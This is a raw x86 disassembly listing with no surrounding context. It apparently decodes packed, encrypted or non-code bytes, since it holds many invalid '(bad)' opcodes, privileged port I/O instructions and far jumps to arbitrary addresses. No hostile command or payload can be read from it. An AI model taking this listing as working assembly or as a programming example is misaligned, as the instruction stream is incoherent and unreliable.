  4152f3:	ss jo  0x4152be
  4152f6:	icebp  
  4152f7:	sbb    edx,edi
  4152f9:	mov    edx,ebp
  4152fb:	adc    al,0x38
  4152fd:	dec    esi
  4152fe:	ret    0x593
  415301:	cwde   
  415302:	jae    0x4152da
  415304:	push   esp
  415305:	jmp    0x415378
  415307:	mov    dl,0x86
  415309:	cs ret 
  41530b:	jno    0x415297
  41530d:	mov    WORD PTR [esi],?
  41530f:	int    0xb9
  415311:	pop    edi
  415312:	inc    edx
  415313:	mov    BYTE PTR gs:[ebp-0x38],0xd2
  415318:	adc    eax,ebx
  41531a:	pop    es
  41531b:	push   ebp
  41531c:	or     dl,BYTE PTR [eax+0x7c]
  41531f:	inc    eax
  415320:	das    
  415321:	ror    DWORD PTR [ebx-0x3f19065],cl
  415327:	jnp    0x415373
  415329:	idiv   dh
  41532b:	mov    ebx,DWORD PTR [ecx+0x58]
  41532e:	sbb    edi,0xffffff8c
  415331:	adc    DWORD PTR [ebp-0x76],ebp
  415334:	sub    al,0x14
  415336:	dec    ebp
  415337:	ret    0x5745
  41533a:	imul   ebp,DWORD PTR [ecx],0x44
  41533d:	in     al,0x77
  41533f:	add    dl,BYTE PTR [eax]
  415341:	out    dx,eax
  415342:	sti    
  415343:	repz sub eax,0xc3f34d38
  415349:	fsub   st,st(4)
  41534b:	ja     0x4153ca
  41534d:	repz dec edi
  41534f:	repz or DWORD PTR [esi+ebx*1+0x48],0x52
  415355:	cli    
  415356:	scas   eax,DWORD PTR es:[edi]
  415357:	hlt    
  415358:	iret   
  415359:	dec    edx
  41535a:	mov    ds:0xadd5acd,al
  41535f:	jl     0x4152e4
  415361:	aaa    
  415362:	mov    bh,0x4b
  415364:	or     bl,BYTE PTR ds:0xb5bd2993
  41536a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41536b:	and    BYTE PTR [edx-0x2f],cl
  41536e:	jb     0x41530f
  415370:	xchg   BYTE PTR [edi-0x68389d44],dh
  415376:	call   0x47ae:0x423bc831
  41537d:	punpckhbw mm0,QWORD PTR [ecx]
  415380:	and    eax,0xe5682e60
  415385:	mov    esp,esp
  415387:	test   eax,0x82de1b05
  41538c:	xor    BYTE PTR [eax+0x3a7d5775],bl
  415392:	aad    0x1f
  415394:	outs   dx,BYTE PTR ds:[esi]
  415395:	popa   
  415396:	lods   al,BYTE PTR ds:[esi]
  415397:	cdq    
  415398:	xchg   esp,eax
  415399:	sar    DWORD PTR [ebx+0x7],0x64
  41539d:	jne    0x41540e
  41539f:	(bad)  
  4153a0:	or     BYTE PTR [ebx-0x41266222],cl
  4153a6:	jl     0x4153a5
  4153a8:	aad    0x70
  4153aa:	int3   
  4153ab:	repnz pop esi
  4153ad:	mov    edx,0x72b57bec
  4153b2:	stc    
  4153b3:	cmp    esi,DWORD PTR [ebp-0x2c]
  4153b6:	mov    bh,0x3a
  4153b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4153b9:	js     0x4153c0
  4153bb:	mov    bl,0x99
  4153bd:	pushf  
  4153be:	stc    
  4153bf:	sub    DWORD PTR [ebx-0xf],ecx
  4153c2:	push   ss
  4153c3:	rcr    DWORD PTR [esi+0x45],cl
  4153c6:	out    0xfc,eax
  4153c8:	sub    BYTE PTR [ebp-0x7e623605],dl
  4153ce:	mov    bl,0x77
  4153d0:	xor    BYTE PTR [ebp+0x4a091295],ch
  4153d6:	dec    ebp
  4153d7:	test   DWORD PTR gs:[ebp+ebx*1+0x1],ecx
  4153dc:	inc    edi
  4153dd:	push   ebx
  4153de:	jnp    0x41537c
  4153e0:	jbe    0x415461
  4153e2:	std    
  4153e3:	int3   
  4153e4:	rcr    BYTE PTR [ebx-0x2d7bf3fd],0x54
  4153eb:	xor    eax,0xda1d2b85
  4153f0:	adc    al,al
  4153f2:	or     bh,BYTE PTR [eax-0x2581559a]
  4153f8:	ins    BYTE PTR es:[edi],dx
  4153f9:	jmp    0x2a8c:0xdc55cb88
  415400:	adc    al,BYTE PTR [eax+edi*2]
  415403:	(bad)  
  415404:	ja     0x41545a
  415406:	xchg   al,bl
  415408:	lds    esi,FWORD PTR ds:0x2733ad19
  41540e:	inc    ebx
  41540f:	in     al,dx
  415410:	adc    eax,0x2f0de2cb
  415415:	leave  
  415416:	dec    eax
  415417:	pop    ds
  415418:	mov    cl,BYTE PTR [eax]
  41541a:	adc    eax,0xddf7ecca
  41541f:	jmp    0xaaf3aeca
  415424:	or     dl,BYTE PTR [eax-0x14eff0b2]
  41542a:	in     al,0x8f
  41542c:	pop    ss
  41542d:	and    BYTE PTR [edi-0x43],ah
  415430:	sbb    al,0x4a
  415432:	xor    al,0xe
  415434:	sub    al,0x11
  415436:	sub    edi,DWORD PTR [eax]
  415438:	lea    eax,[edi+0x33]
  41543b:	xor    al,0x8a
  41543d:	in     al,0xae
  41543f:	mov    DWORD PTR [esp+ecx*8+0x38b8f7bf],ebx
  415446:	jmp    0x41548a
  415448:	call   0xaf91dc8b
  41544d:	sbb    eax,edx
  41544f:	xor    al,0xc4
  415451:	push   edx
  415452:	mov    edi,0xafab580f
  415457:	out    dx,eax
  415458:	cmp    eax,DWORD PTR [edi+0x15e56722]
  41545e:	mov    ah,0x4f
  415460:	sahf   
  415461:	in     al,dx
  415462:	aaa    
  415463:	adc    al,0x20
  415465:	inc    esi
  415466:	jno    0x415414
  415468:	mov    ebx,0x9ad9da9
  41546d:	adc    al,0xdf
  41546f:	(bad)  
  415470:	pusha  
  415471:	fst    DWORD PTR [ebx-0x12]
  415474:	push   ecx
  415475:	sti    
  415476:	fld    DWORD PTR [esi+0x7afd3e9d]
  41547c:	call   DWORD PTR [esi-0x2e]
  41547f:	xor    ebp,DWORD PTR [eax]
  415481:	out    dx,al
  415482:	ror    BYTE PTR [esi-0x7acac81a],1
  415488:	mov    BYTE PTR ds:0xb9caedce,ch
  41548e:	push   eax
  41548f:	(bad)  
  415490:	xchg   esp,eax
  415491:	fadd   DWORD PTR [edi]
  415493:	rol    dl,1
  415495:	rcr    DWORD PTR [eax],cl
  415497:	std    
  415498:	neg    DWORD PTR [esi]
  41549a:	and    edi,DWORD PTR [ebp-0x3f]
  41549d:	cmp    ebp,DWORD PTR [ecx-0x147c0759]
  4154a3:	aaa    
  4154a4:	mov    eax,ds:0xb6f953e1
  4154a9:	rol    DWORD PTR [edx-0x54d8c807],0x36
  4154b0:	aad    0x55
  4154b2:	enter  0x3b9e,0xc9
  4154b6:	mov    bl,0x67
  4154b8:	bound  esi,QWORD PTR ds:0xc6a7c813
  4154be:	neg    DWORD PTR [ebp-0x11ac963d]
  4154c4:	sub    al,0xae
  4154c6:	dec    ebp
  4154c7:	and    al,0xcf
  4154c9:	call   0x5d0f:0x5e320ec8
  4154d0:	repz xchg edi,ecx
  4154d3:	(bad)  
  4154d4:	pop    esi
  4154d5:	arpl   WORD PTR [edx+0x1c103e38],cx
  4154db:	test   BYTE PTR [esi],bl
  4154dd:	leave  
  4154de:	les    ebp,FWORD PTR [ecx-0x4c]
  4154e1:	add    esi,DWORD PTR [ecx-0x3fe6eabb]
  4154e7:	pop    ds
  4154e8:	dec    ecx
  4154e9:	aas    
  4154ea:	mov    al,ds:0xc9893e3e
  4154ef:	xor    DWORD PTR [ecx+esi*8-0x55],esp
  4154f3:	inc    edi
  4154f4:	scas   al,BYTE PTR es:[edi]
  4154f5:	add    cl,BYTE PTR [edi]
  4154f7:	(bad)  
  4154f8:	in     eax,dx
  4154f9:	inc    edi
  4154fa:	cwde   
  4154fb:	jb     0x4154ed
  4154fd:	inc    ecx
  4154fe:	inc    edx
  4154ff:	sub    eax,0x5c244c
  415504:	das    
  415505:	pop    ebx
  415506:	pop    eax
  415507:	mov    esi,0xbb4965cc
  41550c:	lods   eax,DWORD PTR ds:[esi]
  41550d:	arpl   WORD PTR [ecx-0x79b3dce],ax
  415513:	cld    
  415514:	mov    eax,ds:0xb402e68d
  415519:	or     BYTE PTR [edx+0x5f4712f3],0x97
  415520:	push   es
  415521:	mov    ds:0xa3c74121,al
  415526:	lock jnp 0x415523
  415529:	mov    cl,0x2c
  41552b:	cmp    esp,DWORD PTR [esi]
  41552d:	jnp    0x4154f0
  41552f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415530:	mov    al,0x84
  415532:	or     eax,0xf193b4
  415537:	mov    DWORD PTR [ebx],ecx
  415539:	adc    dh,bl
  41553b:	ret    0xd2de
  41553e:	hlt    
  41553f:	enter  0x62b9,0xe3
  415543:	dec    edi
  415544:	mov    bl,0xfb
  415546:	cmp    bh,dl
  415548:	sbb    eax,0x80c74975
  41554d:	xor    esi,DWORD PTR ds:0x3ed6cba6
  415553:	mov    eax,ds:0xdf3ea585
  415558:	mov    edx,0x229f6907
  41555d:	mov    al,0xe8
  41555f:	test   ebx,edx
  415561:	sbb    bh,BYTE PTR [edi]
  415563:	push   es
  415564:	out    dx,eax
  415565:	mov    edx,0x27a66059
  41556a:	jnp    0x4155da
  41556c:	(bad)  
  41556d:	hlt    
  41556e:	xchg   DWORD PTR [eax],eax
  415570:	pop    eax
  415571:	pop    eax
  415572:	(bad)  
  415573:	clc    
  415574:	in     al,0xc9
  415576:	daa    
  415577:	aam    0xc7
  415579:	sbb    ebx,DWORD PTR [esp+eax*1-0x3c]
  41557d:	add    DWORD PTR [esi+0x1f],edx
  415580:	adc    ch,cl
  415582:	sbb    edi,esp
  415584:	add    BYTE PTR [esi+0x32],al
  415587:	and    DWORD PTR [ecx],edx
  415589:	mov    dl,0x7f
  41558b:	or     eax,0x33fa58ad
  415590:	dec    edx
  415592:	mov    cl,0xf1
  415594:	cmp    BYTE PTR [ecx+0x7e19b906],0xa3
  41559b:	test   BYTE PTR [ecx+0x34],cl
  41559e:	mov    al,ds:0x8d4414b8
  4155a3:	jno    0x4155bd
  4155a5:	or     dh,BYTE PTR [ecx]
  4155a7:	or     al,0xf9
  4155a9:	in     eax,dx
  4155aa:	cmp    eax,0xea466e7a
  4155af:	and    dh,cl
  4155b1:	xchg   BYTE PTR [eax+0xc30a3ec],cl
  4155b7:	in     al,0xde
  4155b9:	and    eax,DWORD PTR [esi+0x2]
  4155bc:	enter  0x97e0,0x85
  4155c0:	out    0xe3,al
  4155c2:	fsub   QWORD PTR [ebp+0x20585a77]
  4155c8:	push   edi
  4155c9:	repnz pop ds
  4155cb:	sub    ch,BYTE PTR [ecx+0x5d22872]
  4155d1:	mov    ds:0xdf5ab392,eax
  4155d6:	not    DWORD PTR [ebx]
  4155d8:	stos   DWORD PTR es:[edi],eax
  4155d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4155da:	jno    0x415561
  4155dc:	in     al,0xf8
  4155de:	popf   
  4155df:	outs   dx,BYTE PTR ds:[esi]
  4155e0:	xchg   esi,eax
  4155e1:	lock xchg BYTE PTR [edi],bh
  4155e4:	test   BYTE PTR ds:0x23be06db,bl
  4155ea:	stc    
  4155eb:	cmp    ebp,edi
  4155ed:	pop    ss
  4155ee:	in     eax,0xdd
  4155f0:	push   ebx
  4155f1:	js     0x4155ea
  4155f3:	xlat   BYTE PTR ds:[ebx]
  4155f4:	pusha  
  4155f5:	jmp    0xa3c0549b
  4155fa:	mov    eax,ds:0x8cb62f48
  4155ff:	pop    edi
  415600:	cdq    
  415601:	ret    0xacc7
  415604:	dec    eax
  415605:	ds daa 
  415607:	fs scas eax,DWORD PTR es:[edi]
  415609:	scas   eax,DWORD PTR es:[edi]
  41560a:	pop    ds
  41560b:	addr16 gs std 
  41560e:	pushf  
  41560f:	fmul   QWORD PTR [esi+0x245a6c38]
  415615:	jmp    0x415667
  415617:	adc    eax,0xcb4f25d6
  41561c:	jno    0x415694
  41561e:	and    eax,0xd7ef9512
  415623:	or     eax,0xfcbb9f2d
  415628:	jmp    FWORD PTR [ebx-0x69]
  41562b:	sub    bl,bh
  41562d:	pop    ds
  41562e:	push   ebp
  41562f:	mov    dl,0x0
  415631:	cmp    ch,BYTE PTR [ecx]
  415633:	call   0x983c7261
  415638:	dec    esp
  415639:	mov    bl,0x5
  41563b:	pop    eax
  41563c:	aad    0x8e
  41563e:	jecxz  0x415645
  415640:	test   DWORD PTR [edx+0x1c0c1e8d],0xcb3462d3
  41564a:	xchg   ebx,eax
  41564b:	sahf   
  41564c:	or     DWORD PTR [edx+eiz*8-0x75],0xffffffd3
  415651:	into   
  415652:	scas   al,BYTE PTR es:[edi]
  415653:	stc    
  415654:	pop    edi
  415655:	cwde   
  415656:	adc    eax,0xb84e263d
  41565b:	leave  
  41565c:	dec    eax
  41565d:	adc    ah,ah
  41565f:	and    eax,0x43850474
  415664:	xor    edi,edi
  415666:	push   0x9742e093
  41566b:	and    ebx,DWORD PTR [edx]
  41566d:	repnz adc al,0x40
  415670:	call   0x8c03:0x968575f0
  415677:	ins    BYTE PTR es:[edi],dx
  415678:	imul   edi,DWORD PTR [edi-0xee496b4],0x58498b0b
  415682:	sbb    bh,ah
  415684:	adc    DWORD PTR [esi+0xb],esi
  415687:	xchg   edx,eax
  415688:	jl     0x4156f2
  41568a:	clc    
  41568b:	mov    esi,0x382e0dc7
  415690:	adc    eax,0xac5bfdf3
  415695:	bound  esi,QWORD PTR [eax+ebp*4]
  415698:	(bad)  
  41569a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41569b:	mov    DWORD PTR fs:[edi],edi
  41569e:	dec    ebp
  41569f:	jle    0x415669
  4156a1:	cmp    DWORD PTR [ecx],0x10
  4156a4:	popf   
  4156a5:	or     ebp,DWORD PTR [edx-0x47]
  4156a8:	jmp    0x2f4ccdfa
  4156ad:	ret    0x1eb4
  4156b0:	inc    ebp
  4156b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156b2:	push   cs
  4156b3:	adc    eax,DWORD PTR [esi-0x5d46f920]
  4156b9:	bound  ebx,QWORD PTR [ecx]
  4156bb:	inc    eax
  4156bc:	add    eax,0xaa90d3b6
  4156c1:	sub    BYTE PTR [eax+0x4d5e31c3],dh
  4156c7:	or     ah,BYTE PTR [edi+0x50]
  4156ca:	inc    edx
  4156cb:	mov    ds:0x629d7ef9,al
  4156d0:	jns    0x4156fd
  4156d2:	jecxz  0x415684
  4156d4:	arpl   bp,si
  4156d6:	sbb    al,0xc0
  4156d8:	gs out dx,eax
  4156da:	in     al,dx
  4156db:	out    0x58,eax
  4156dd:	xchg   edx,eax
  4156de:	icebp  
  4156df:	in     eax,0xf8
  4156e1:	mov    esp,0xc3e38892
  4156e6:	call   0xf84df3dd
  4156eb:	ret    
  4156ec:	mov    ch,0x11
  4156ee:	out    dx,eax
  4156ef:	dec    edi
  4156f0:	cmp    BYTE PTR [ecx+0x6e],bh
  4156f3:	std    
  4156f4:	lods   eax,DWORD PTR ds:[esi]
  4156f5:	mov    ecx,DWORD PTR [ebx]
  4156f7:	mov    eax,0xe63e7066
  4156fc:	nop
  4156fd:	addr16 jbe 0x415733
  415700:	push   eax
  415701:	das    
  415702:	lock push esi
  415704:	js     0x41570a
  415706:	mov    ds:0x394c6c8d,al
  41570b:	add    al,0x78
  41570d:	inc    esi
  41570e:	leave  
  41570f:	pusha  
  415710:	ja     0x41570c
  415712:	mov    DWORD PTR [ecx+ebp*2],ecx
  415715:	imul   edx,DWORD PTR [ecx-0x5],0x1d840257
  41571c:	cmp    BYTE PTR [ebx+0x73dfa1a9],bh
  415722:	mov    edi,0xc4dfb96d
  415727:	jg     0x4157a6
  415729:	jmp    0x20bb:0xd6170407
  415730:	cmc    
  415731:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415732:	fadd   st,st(1)
  415734:	and    al,0xf2
  415736:	out    dx,eax
  415737:	dec    ebp
  415738:	mov    eax,ds:0x9891f7e8
  41573d:	div    DWORD PTR [edi]
  41573f:	dec    ebx
  415740:	sub    ebx,edx
  415742:	(bad)  
  415743:	mov    ds:0x5d53758e,al
  415748:	into   
  415749:	lea    esi,[eax-0x8040b4a]
  41574f:	test   esi,ecx
  415751:	outs   dx,BYTE PTR ds:[esi]
  415752:	dec    ebx
  415753:	push   ss
  415754:	pop    ecx
  415755:	and    eax,0xa29dcff2
  41575a:	pusha  
  41575b:	jae    0x4157b9
  41575d:	cmp    edi,DWORD PTR [ebp-0x52]
  415760:	rcr    ebp,1
  415762:	or     al,bl
  415764:	pop    edx
  415765:	push   0x4f
  415767:	vpaddb xmm0,xmm1,XMMWORD PTR [ebp-0x4c]
  41576c:	xchg   ecx,eax
  41576d:	ror    DWORD PTR ds:0xdf5d078f,1
  415773:	add    ch,BYTE PTR [esi]
  415775:	lea    edx,[ecx+0x560a80e7]
  41577b:	out    0x8,al
  41577d:	aas    
  41577e:	cmp    ecx,DWORD PTR [eax+0x3c]
  415781:	ret    
  415782:	(bad)
  415785:	mov    esi,0xe08d13ea
  41578a:	(bad)  
  41578b:	mov    cl,0x43
  41578d:	pop    esp
  41578e:	jg     0x415751
  415790:	mul    DWORD PTR [edi+0x10]
  415793:	mov    bh,0xe3
  415795:	add    DWORD PTR [eax+0x43b2973a],eax
  41579b:	inc    edi
  41579c:	in     al,dx
  41579d:	out    dx,al
  41579e:	xchg   ecx,eax
  41579f:	cmp    DWORD PTR [ecx+eiz*2-0x7216864a],ebx
  4157a6:	sbb    al,0x2
  4157a8:	push   esi
  4157a9:	adc    DWORD PTR [eax+eax*4],eax
  4157ac:	fnsave [eax]
  4157ae:	repz dec ecx
  4157b0:	sbb    dh,BYTE PTR [ebx+eax*1]
  4157b3:	repz push ecx
  4157b5:	(bad)  
  4157b6:	mul    DWORD PTR [eax+0x53446490]
  4157bc:	ret    0x6407
  4157bf:	enter  0x9985,0xab
  4157c3:	cmp    eax,0xa9da729a
  4157c8:	cs scas eax,DWORD PTR es:[edi]
  4157ca:	repnz call 0x5925:0xb839a15c
  4157d2:	mov    dl,0x64
  4157d4:	push   ss
  4157d5:	ins    DWORD PTR es:[edi],dx
  4157d6:	mov    ds:0x1e4b2e1d,al
  4157db:	jge    0x41576e
  4157dd:	call   0xe52c1cce
  4157e2:	mov    al,0xe6
  4157e4:	add    eax,edx
  4157e6:	lock adc esp,DWORD PTR [edx-0x1f]
  4157ea:	loope  0x415788
  4157ec:	mov    al,0xcf
  4157ee:	xor    al,ch
  4157f0:	mov    ds:0x2acd2d75,al
  4157f5:	pop    ds
  4157f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4157f7:	inc    edi
  4157f8:	push   ss
  4157f9:	mov    edx,0xf50cc97b
  4157fe:	imul   ebp,DWORD PTR [edi-0x4b],0x5b
  415802:	xlat   BYTE PTR ds:[ebx]
  415803:	inc    eax
  415804:	out    dx,al
  415805:	arpl   sp,sp
  415807:	adc    eax,0xfd6795fb
  41580c:	retf   
  41580d:	ret    0x23bf
  415810:	mov    al,0x54
  415812:	mov    ebx,0xfa28cf13
  415817:	popa   
  415818:	in     al,dx
  415819:	jmp    0x4157e4
  41581b:	mov    ah,0x6c
  41581d:	inc    edi
  41581e:	out    dx,al
  41581f:	push   es
  415820:	stc    
  415821:	pop    ecx
  415822:	fisubr WORD PTR [bx+0x7fec]
  415827:	cmp    eax,0xacf44d36
  41582c:	xor    eax,0x41e7b581
  415831:	pop    esp
  415832:	repnz sub al,0x9b
  415835:	sub    eax,0x239af634
  41583a:	cmp    eax,0x60412114
  41583f:	call   DWORD PTR [edx+0x61]
  415842:	mov    ds,WORD PTR [edi-0x49e5e343]
  415848:	cwde   
  415849:	sar    DWORD PTR [ecx+0x3a45bea2],0xa6
  415850:	stos   BYTE PTR es:[edi],al
  415851:	outs   dx,DWORD PTR ds:[esi]
  415852:	fnstenv [ebp*8+0x52778b]
  415859:	cdq    
  41585a:	jmp    0x415890
  41585c:	stc    
  41585d:	mov    al,ds:0x27b6e999
  415862:	jmp    0x21f6:0x826f44ff
  415869:	shl    BYTE PTR [edi+0x8],1
  41586c:	aas    
  41586d:	dec    ebp
  41586e:	int3   
  41586f:	mov    al,0xd0
  415871:	(bad)  
  415872:	jmp    0x24be:0xe174e0c9
  415879:	fmul   DWORD PTR [ecx+0x221bf052]
  41587f:	jmp    0xb6e8:0x5079679b
  415886:	adc    dl,ch
  415888:	in     eax,0x62
  41588a:	push   ebx
  41588b:	retf   
  41588c:	mov    esi,0x35bf4f99
  415891:	adc    edx,edx
  415893:	adc    BYTE PTR [ecx],0xa9
  415896:	push   0x16
  415898:	pop    es
  415899:	scas   al,BYTE PTR es:[edi]
  41589a:	in     eax,0x5e
  41589c:	mov    ds:0x7adb62,al
  4158a1:	popf   
  4158a2:	pop    esi
  4158a3:	iret   
  4158a4:	jecxz  0x415916
  4158a6:	ficom  WORD PTR [edi]
  4158a8:	loopne 0x4158d8
  4158aa:	pop    ecx
  4158ab:	popa   
  4158ac:	pop    ecx
  4158ad:	push   0xfffffff3
  4158af:	in     al,dx
  4158b0:	mov    bh,0xa1
  4158b2:	sbb    edx,ebp
  4158b4:	pop    esi
  4158b5:	mov    dl,0xbf
  4158b7:	xchg   esi,eax
  4158b8:	mov    ebp,0xe9ecb88c
  4158bd:	cld    
  4158be:	xor    DWORD PTR [esi+0x69],edx
  4158c1:	xchg   esp,eax
  4158c2:	stos   DWORD PTR es:[edi],eax
  4158c3:	or     DWORD PTR [edx+0x69],edi
  4158c6:	test   eax,0x4c1b4cb1
  4158cb:	jge    0x4158d9
  4158cd:	loop   0x41585e
  4158cf:	sub    DWORD PTR [edi-0x67],ebp
  4158d2:	ins    BYTE PTR es:[edi],dx
  4158d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4158d4:	jno    0x415954
  4158d6:	clc    
  4158d7:	call   0xd4d926bc
  4158dc:	sbb    al,ah
  4158de:	jno    0x41594e
  4158e0:	ss stos BYTE PTR es:[edi],al
  4158e2:	ds sbb ah,dh
  4158e5:	pop    ebp
  4158e6:	int3   
  4158e7:	test   eax,0x73bbb45c
  4158ec:	dec    ecx
  4158ed:	popf   
  4158ee:	jae    0x4158ca
  4158f0:	ret    
  4158f1:	xor    eax,0x66c4652d
  4158f6:	(bad)  
  4158f7:	(bad)  
  4158f8:	pop    ss
  4158f9:	push   cs
  4158fa:	pusha  
  4158fb:	xor    al,bh
  4158fd:	repnz pop ebx
  4158ff:	shl    eax,0x48
  415902:	das    
  415903:	dec    eax
  415904:	push   edi
  415905:	jmp    0xd8965461
  41590a:	dec    esi
  41590b:	outs   dx,DWORD PTR ds:[esi]
  41590c:	std    
  41590d:	jg     0x4158c5
  41590f:	add    edx,ebx
  415911:	test   al,0xb9
  415913:	mov    esi,0xaf4d2cc1
  415918:	push   edi
  415919:	dec    edi
  41591a:	mov    bl,0xc1
  41591c:	and    ebx,DWORD PTR [ebx-0x3def870e]
  415922:	push   esp
  415923:	loope  0x41591a
  415925:	and    cl,BYTE PTR [ecx+0x1edc91cd]
  41592b:	push   ds
  41592c:	call   0x56d390b1
  415931:	dec    ebx
  415932:	lahf   
  415933:	pop    es
  415934:	ret    0xe9cf
  415937:	mov    es,WORD PTR [ebx-0x1cd3ea3e]
  41593d:	ins    DWORD PTR es:[edi],dx
  41593e:	dec    ebx
  41593f:	(bad)  
  415940:	xchg   edx,eax
  415941:	jns    0x4159c2
  415943:	or     BYTE PTR [eax],al
  415945:	pushf  
  415946:	mov    al,0x7d
  415948:	in     al,dx
  415949:	mov    al,ds:0x4001b9a
  41594e:	jle    0x41599f
  415950:	add    DWORD PTR [ebp+0x79],edi
  415953:	icebp  
  415954:	jne    0x415997
  415956:	sbb    bh,BYTE PTR [edx-0x25]
  415959:	xor    DWORD PTR [esi+eiz*1],0x76e8ff23
  415960:	dec    edi
  415961:	jo     0x41591f
  415963:	sbb    al,0x13
  415965:	ins    DWORD PTR es:[edi],dx
  415966:	pusha  
  415967:	call   DWORD PTR fs:[edi]
  41596a:	dec    ecx
  41596b:	add    dl,BYTE PTR [edx+ebx*8-0x16]
  41596f:	daa    
  415970:	into   
  415971:	push   ebx
  415972:	scas   al,BYTE PTR es:[edi]
  415973:	int    0x3e
  415975:	or     eax,DWORD PTR [esi+ebx*2-0x6f7de972]
  41597c:	ins    DWORD PTR es:[edi],dx
  41597d:	ds in  al,dx
  41597f:	mov    cl,0xd4
  415981:	lods   al,BYTE PTR ds:[esi]
  415982:	mov    bh,0x8b
  415984:	pop    es
  415985:	or     ah,al
  415987:	cmp    eax,0x897c6085
  41598c:	jne    0x4159e3
  41598e:	inc    ecx
  41598f:	mov    dl,0xd7
  415991:	outs   dx,BYTE PTR ds:[esi]
  415992:	sbb    ah,BYTE PTR [ebx-0x8618442]
  415998:	push   ebx
  415999:	stos   BYTE PTR es:[edi],al
  41599a:	(bad)  
  41599b:	neg    DWORD PTR [esi-0x6b]
  41599e:	pop    esp
  41599f:	add    ecx,DWORD PTR [eax]
  4159a1:	jbe    0x4159a9
  4159a3:	push   ecx
  4159a4:	pop    ds
  4159a5:	xchg   esi,eax
  4159a6:	mov    edi,DWORD PTR [ebx]
  4159a8:	(bad)  
  4159a9:	sub    al,0xf8
  4159ab:	dec    esp
  4159ac:	or     BYTE PTR [edx+edi*4+0x59b00c6c],al
  4159b3:	inc    ebx
  4159b4:	ds xor bl,cl
  4159b7:	pop    ss
  4159b8:	jmp    0x2cc7:0xe259b11e
  4159bf:	jmp    0x199bb140
  4159c4:	pop    ds
  4159c5:	cwde   
  4159c6:	mov    ebx,ebp
  4159c8:	sar    BYTE PTR [ecx],cl
  4159ca:	jmp    0x7f4afedc
  4159cf:	sbb    BYTE PTR [ebx],0x9f
  4159d2:	les    ebp,FWORD PTR [eax+eax*8-0x5d]
  4159d6:	mov    bh,0x99
  4159d8:	cs or  eax,0xedbb34c
  4159de:	ja     0x415a11
  4159e0:	push   edi
  4159e1:	retf   
  4159e2:	sbb    BYTE PTR [esi-0x66],dh
  4159e5:	jae    0x415a1d
  4159e7:	(bad)  
  4159e8:	mov    esi,0x5f231f50
  4159ed:	mov    ebp,0xfbb49476
  4159f2:	xchg   edx,eax
  4159f3:	jae    0x415a5f
  4159f5:	jecxz  0x415988
  4159f7:	inc    edi
  4159f8:	mov    edx,0x33159c4e
  4159fd:	enter  0x4f34,0xf0
  415a01:	mov    ds:0x9c49f29c,eax
  415a06:	xchg   ebp,eax
  415a07:	xor    edi,DWORD PTR [edx-0x73fa5aba]
  415a0d:	adc    ebx,DWORD PTR [ebx-0x3d9874a]
  415a13:	xchg   edi,eax
  415a14:	add    BYTE PTR [ecx+0x7f],dl
  415a17:	cmp    BYTE PTR ds:0xe02caa44,ch
  415a1d:	push   ebp
  415a1e:	retf   
  415a1f:	les    eax,FWORD PTR [eax+ebx*8]
  415a22:	pop    edx
  415a23:	retf   
  415a24:	jge    0x415a5c
  415a26:	imul   edx,DWORD PTR cs:0xc0ce86e2,0x3c
  415a2e:	(bad)  
  415a2f:	arpl   WORD PTR [edi+0x5c],dx
  415a32:	std    
  415a33:	and    eax,edi
  415a35:	ss call 0xa3dd:0x42b2d7c4
  415a3d:	cmp    bl,BYTE PTR [eax+0x29]
  415a40:	inc    esp
  415a41:	xchg   esi,eax
  415a42:	mov    esi,0xb1aed1e1
  415a47:	push   ecx
  415a48:	mov    al,0xe
  415a4a:	mov    al,ds:0x87bda059
  415a4f:	xor    ecx,edx
  415a51:	cli    
  415a52:	popa   
  415a53:	mov    dh,0x10
  415a55:	xchg   esp,eax
  415a56:	mov    ds,WORD PTR [esi+0x78]
  415a59:	inc    esi
  415a5a:	lock aad 0x6
  415a5d:	push   ebp
  415a5e:	or     cl,BYTE PTR ds:[edi+0x7c]
  415a62:	sub    ecx,DWORD PTR [ebx+edi*4-0x19]
  415a66:	les    ebx,FWORD PTR [edx]
  415a68:	xchg   ecx,eax
  415a69:	call   0xead861a6
  415a6e:	shr    DWORD PTR [ebx],0x78
  415a71:	out    0x1d,eax
  415a73:	cmp    eax,0xe5c64494
  415a78:	inc    esp
  415a79:	bound  edx,QWORD PTR [esi+0x60]
  415a7c:	add    esi,DWORD PTR [ecx-0x4f]
  415a7f:	ins    BYTE PTR es:[edi],dx
  415a80:	or     al,0x53
  415a82:	enter  0x2146,0x2a
  415a86:	xchg   edi,eax
  415a87:	retf   
  415a88:	xor    bh,bh
  415a8a:	faddp  st(2),st
  415a8c:	dec    ecx
  415a8d:	scas   eax,DWORD PTR es:[edi]
  415a8e:	jp     0x415ab9
  415a90:	inc    edi
  415a91:	mov    WORD PTR [edx],gs
  415a93:	jecxz  0x415a31
  415a95:	dec    eax
  415a96:	push   es
  415a97:	adc    ebx,esi
  415a99:	not    cl
  415a9b:	mov    al,BYTE PTR [edx-0x2dbb7642]
  415aa1:	or     dl,ah
  415aa3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415aa4:	stos   DWORD PTR es:[edi],eax
  415aa5:	cmp    eax,0xc5b42669
  415aaa:	jnp    0x415ad6
  415aac:	inc    al
  415aae:	or     ch,BYTE PTR [eax+0x5b01608]
  415ab4:	mov    WORD PTR [ebp-0x33cfeb09],cs
  415aba:	in     al,0xa
  415abc:	dec    ebp
  415abd:	jge    0x415ab1
  415abf:	dec    esi
  415ac0:	ds out 0x68,al
  415ac3:	cmp    bh,BYTE PTR [edx-0x26]
  415ac6:	pop    ebp
  415ac7:	cmp    al,0xda
  415ac9:	fs pop ebp
  415acb:	int3   
  415acc:	data16 int3 
  415ace:	sbb    al,al
  415ad0:	cs (bad) 
  415ad2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ad3:	int    0x6a
  415ad5:	out    0xab,al
  415ad7:	cmp    dl,BYTE PTR [esi+0x5d73058]
  415add:	(bad)  
  415ade:	addr16 out dx,al
  415ae0:	ret    
  415ae1:	xchg   dl,cl
  415ae3:	stos   BYTE PTR es:[edi],al
